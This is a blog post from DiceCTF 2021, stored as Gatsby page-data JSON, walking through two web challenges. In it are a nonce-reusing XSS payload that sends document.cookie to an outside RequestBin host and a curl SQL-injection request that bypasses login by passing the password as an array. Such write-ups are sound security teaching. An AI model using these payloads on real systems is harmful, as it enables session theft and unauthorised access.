{"componentChunkName":"component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx","path":"/blog/dicectf-2021","result":{"data":{"post":{"slug":"/blog/dicectf-2021","title":"DiceCTF 2021","date":"Feb 8th 2021","tags":[{"name":"Cryptography","slug":"cryptography"},{"name":"Exploits","slug":"exploits"},{"name":"Writeups","slug":"writeups"}],"description":null,"canonicalUrl":null,"body":"var _excluded = [\"components\"];\n\nfunction _extends() { _extends = Object.assign ? Object.assign.bind() : function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"DiceCTF 2021\",\n  \"date\": \"2021-02-08T00:00:00.000Z\",\n  \"tags\": [\"Cryptography\", \"Exploits\", \"Writeups\"],\n  \"banner\": \"./dicectf-2021.jpg\",\n  \"slug\": \"/dicectf-2021\"\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, _excluded);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"This weekend, I participated in \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://ctf.dicega.ng\"\n  }, \"DiceCTF 2021\"), \" just for fun. I wanted to write about a couple of challenges that I found interesting, along with the processes I went through to solve them.\"), mdx(\"h2\", {\n    id: \"babier-csp\"\n  }, \"Babier CSP\"), mdx(\"p\", null, \"This challenge requires us to steal a cookie set on an admin bot. It provides us with the source of a backend that both serves a simple page and generates the secret that the admin sets its cookie to. From a quick glance at the page that gets served, it seems that an \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://owasp.org/www-community/attacks/xss/\"\n  }, \"XSS attack\"), \" might be viable:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-js\",\n    \"metastring\": \"{8,13,16,26-27}\",\n    \"{8,13,16,26-27}\": true\n  }, \"const express = require('express');\\nconst crypto = require(\\\"crypto\\\");\\nconst config = require(\\\"./config.js\\\");\\nconst app = express()\\nconst port = process.env.port || 3000;\\n\\nconst SECRET = config.secret;\\nconst NONCE = crypto.randomBytes(16).toString('base64');\\n\\nconst template = name => `\\n<html>\\n\\n${name === '' ? '': `<h1>${name}</h1>`}\\n<a href='#' id=elem>View Fruit</a>\\n\\n<script nonce=${NONCE}>\\nelem.onclick = () => {\\n  location = \\\"/?name=\\\" + encodeURIComponent([\\\"apple\\\", \\\"orange\\\", \\\"pineapple\\\", \\\"pear\\\"][Math.floor(4 * Math.random())]);\\n}\\n</script>\\n\\n</html>\\n`;\\n\\napp.get('/', (req, res) => {\\n  res.setHeader(\\\"Content-Security-Policy\\\", `default-src none; script-src 'nonce-${NONCE}';`);\\n  res.send(template(req.query.name || \\\"\\\"));\\n})\\n\\napp.use('/' + SECRET, express.static(__dirname + \\\"/secret\\\"));\\n\\napp.listen(port, () => {\\n  console.log(`Example app listening at http://localhost:${port}`)\\n})\\n\")), mdx(\"p\", null, \"From the above-highlighted points of interest, two things are immediately clear:\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"If the page is loaded with a \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"name\"), \" query param present, it will be injected directly into the source.\"), mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"A \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"NONCE\"), \" constant is generated once at application startup and set as the nonce for the content security policy \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"script-src\"), \" directive.\")), mdx(\"p\", null, \"If you try visiting the page with a crafted query such as \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cem%3EUh%20oh...%3C/em%3E%3Cbr%3E\"\n  }, \"https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cem%3EUh%20oh...%3C/em%3E%3Cbr%3E\"), \", you'll be able to see the potential for exploitation.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"312px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"42.91666666666667%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2UlEQVQoz7WSwWrCQBCG9/2fob2UknhoEbz04CGCVmitVpIGhRUPkdpbC622rO7MVxKMByllc3BgYHdm9uNn/jXOOVSV06hrf/X+C5MkPeI4pihWpGlGFEU4t0NEK1idoXBj7YzJ5InFwpLnLwwGfdZvBZvNZ4mo9QYrNa8FbL8ObxVUwM6Un29l55SP92ZQc9f23F7vubnydFqepfVEF55uR2hd+iobAeeZMLoXnh+EdCyU93wqZGNhmAjTR8HvG+ww1L3gHZaDpaOVq7Wzh/OxrmdQGPoPfwFMObv2cgJO5AAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"The simple page affected by an XSS attack.\",\n    \"title\": \"The simple page affected by an XSS attack.\",\n    \"src\": \"/static/4435d53b9e9e026cad29ea68cf052019/93a14/uh-oh.png\",\n    \"srcSet\": [\"/static/4435d53b9e9e026cad29ea68cf052019/5243c/uh-oh.png 240w\", \"/static/4435d53b9e9e026cad29ea68cf052019/93a14/uh-oh.png 312w\"],\n    \"sizes\": \"(max-width: 312px) 100vw, 312px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"If you try the same thing with script tags, however, you'll receive a CSP error in the console. Fortunately, because the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"NONCE\"), \" constant is consistent between page loads, you can simply tack it on to each script tag using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"nonce\"), \" attribute.\"), mdx(\"p\", null, \"From here, it's evident that we can steal the cookie from the admin bot by getting it to visit the XSS vulnerable page. A simple payload like the following should do:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-html\"\n  }, \"<script nonce=\\\"LRGWAXOY98Es0zz0QOVmag==\\\">\\n  document.location = \\\"https://example.x.pipedream.net/?\\\" + document.cookie;\\n</script>\\n\")), mdx(\"p\", null, \"Now just spin up a new \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://requestbin.com\"\n  }, \"RequestBin\"), \", URL encode your payload, and submit it to the admin bot.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"31.25%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+UlEQVQY042R226DMBBE+f//qxQiQRqSlNxsfDcQw6lMkhb1qSONdtaWx/ZssakaPo8t1f6E6izaerQLuNBjfVzqole9Db/rxgWUccs5ZT3FVShSSrgYEcmT8RhHjDE459BaYzJXvTUGpRRaKYZhYI3icu/wIWJC4OAEPkZuQiKEwFqLlBIpO7psYAyye+q8L6QkhMA8z0zTxDTNFOdbxzCO+NATfY/SFqkMsR8YH4n/IBu+ayG1fX4zJWLf43x4XRCXfo0czZv5RX/1YljWR3KOX1fBR1lTVg05hvOL7VXQ3iSny52ybn6Yh7jdHdjWDXmwm2rP7tDyDX/TzW1m0FhSAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"The admin bot request caught by RequestBin.\",\n    \"title\": \"The admin bot request caught by RequestBin.\",\n    \"src\": \"/static/003f449e3d144edda47e0d99a03f3fc3/7d769/requestbin.png\",\n    \"srcSet\": [\"/static/003f449e3d144edda47e0d99a03f3fc3/5243c/requestbin.png 240w\", \"/static/003f449e3d144edda47e0d99a03f3fc3/ab158/requestbin.png 480w\", \"/static/003f449e3d144edda47e0d99a03f3fc3/7d769/requestbin.png 960w\", \"/static/003f449e3d144edda47e0d99a03f3fc3/ae072/requestbin.png 1225w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"There's our secret! As per the source code, we should use it as a route name to get the flag: \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"dice{web_1s_a_stat3_0f_grac3_857720}\"), \".\"), mdx(\"h2\", {\n    \"id\": \"missing-flavortext\"\n  }, \"Missing Flavortext\"), mdx(\"p\", null, \"This was an interesting challenge with a clear focus on \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://owasp.org/www-community/attacks/SQL_Injection\"\n  }, \"SQL injection\"), \". Similar to \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"#babier-csp\"\n  }, \"Babier CSP\"), \", we're given a simple page to visit and the source of the backend that serves it. The page contains a login form that posts data to a \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/login\"), \" route. If you were to provide the correct credentials, it would send back the flag. Unfortunately, since the password is randomized at application startup, we're going to need to find a different way in...\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-js\",\n    \"metastring\": \"{13-16,33-35,38-41}\",\n    \"{13-16,33-35,38-41}\": true\n  }, \"const crypto = require('crypto');\\nconst db = require('better-sqlite3')('db.sqlite3')\\n\\n// remake the `users` table\\ndb.exec(`DROP TABLE IF EXISTS users;`);\\ndb.exec(`CREATE TABLE users(\\n  id INTEGER PRIMARY KEY AUTOINCREMENT,\\n  username TEXT,\\n  password TEXT\\n);`);\\n\\n// add an admin user with a random password\\ndb.exec(`INSERT INTO users (username, password) VALUES (\\n  'admin',\\n  '${crypto.randomBytes(16).toString('hex')}'\\n)`);\\n\\nconst express = require('express');\\nconst bodyParser = require('body-parser');\\n\\nconst app = express();\\n\\n// parse json and serve static files\\napp.use(bodyParser.urlencoded({ extended: true }));\\napp.use(express.static('static'));\\n\\n// login route\\napp.post('/login', (req, res) => {\\n  if (!req.body.username || !req.body.password) {\\n    return res.redirect('/');\\n  }\\n\\n  if ([req.body.username, req.body.password].some(v => v.includes('\\\\''))) {\\n    return res.redirect('/');\\n  }\\n\\n  // see if user is in database\\n  const query = `SELECT id FROM users WHERE\\n    username = '${req.body.username}' AND\\n    password = '${req.body.password}'\\n  `;\\n\\n  let id;\\n  try { id = db.prepare(query).get()?.id } catch {\\n    return res.redirect('/');\\n  }\\n\\n  // correct login\\n  if (id) return res.sendFile('flag.html', { root: __dirname });\\n\\n  // incorrect login\\n  return res.redirect('/');\\n});\\n\\napp.listen(3000);\\n\")), mdx(\"p\", null, \"There are two key issues in this code that we're going to exploit. The first is in how the SQL query is created on lines 38\\u201341. Interpolating raw user inputs in that fashion is a massive security hole. The only \\\"sanitization\\\" applied to it is in the few lines before, where the credentials are rejected if either one contains an apostrophe character. At a first glance, this seems to prevent us from executing the standard SQLi technique of escaping from an input and modifying the query that way. Fortunately, the second key issue makes it possible:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-js\"\n  }, \"app.use(bodyParser.urlencoded({ extended: true }));\\n\")), mdx(\"p\", null, \"By opting into the extended mode of the URL-encoded body-parser middleware, the server will now accept extended input types such as arrays and objects. If we modify the username or password in such a way, we can alter the behavior of the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"v.includes('\\\\'')\"), \" method call to work in our favor.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-bash\"\n  }, \"curl -X \\\"POST\\\" \\\"https://missing-flavortext.dicec.tf/login\\\" \\\\\\n  --data-urlencode \\\"username=admin\\\" \\\\\\n  --data-urlencode \\\"password[]=' OR 1 --\\\"\\n\")), mdx(\"p\", null, \"Because arrays with a single element are cleanly converted to strings in JavaScript, we'll end up skipping the apostrophe check while still containing one. This will lead to our malformed payload being constructed as we want:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-sql\"\n  }, \"SELECT id FROM users WHERE\\n  username = 'admin' AND\\n  password = '' OR 1 --'\\n\")), mdx(\"p\", null, \"This will correctly select the id of the admin user, skipping the intended credential check and returning the flag: \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}\"), \".\"));\n}\n;\nMDXContent.isMDXComponent = true;","excerpt":"This weekend, I participated in  DiceCTF 2021  just for fun. I wanted to write about a couple of challenges that I found interesting, along…","timeToRead":2,"banner":{"childImageSharp":{"resize":{"src":"/static/f3a05442806e6de0ee90cddf38bc6677/a6c62/dicectf-2021.jpg"}}}}},"pageContext":{"slug":"/blog/dicectf-2021","formatString":"MMM Do YYYY"}},"staticQueryHashes":["2744905544","3090400250","318001574"]}